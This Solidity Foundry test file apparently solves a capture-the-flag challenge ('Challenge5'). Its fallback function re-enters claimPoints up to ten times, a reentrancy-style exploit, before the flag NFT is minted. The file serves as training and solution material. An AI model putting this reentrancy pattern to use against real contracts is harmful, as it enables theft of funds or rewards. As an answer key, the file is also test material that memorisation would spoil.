// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {console} from "forge-std/Test.sol";
import {BaseTest} from "./BaseTest.sol";
import {Challenge5} from "../src/Challenge5.sol";
import {NFTFlags} from "../src/NFTFlags.sol";

contract Challenge5Test is BaseTest {
    Challenge5 challenge5;

    uint256 callCount = 0;

    function setUp() public {
        setUpChallenges();

        vm.prank(ADMIN);
        challenge5 = new Challenge5(address(nftFlags));
        vm.prank(ADMIN);
        nftFlags.addAllowedMinter(address(challenge5));
    }

    function test_challenge5() public {
        vm.startPrank(PLAYER, PLAYER);

        challenge5.claimPoints();
        callCount++;

        challenge5.mintFlag();

        assertTrue(nftFlags.hasMinted(PLAYER, 5));
    }

    fallback() external {
        if (callCount < 10) {
            callCount++;
            challenge5.claimPoints();
        }
    }
}
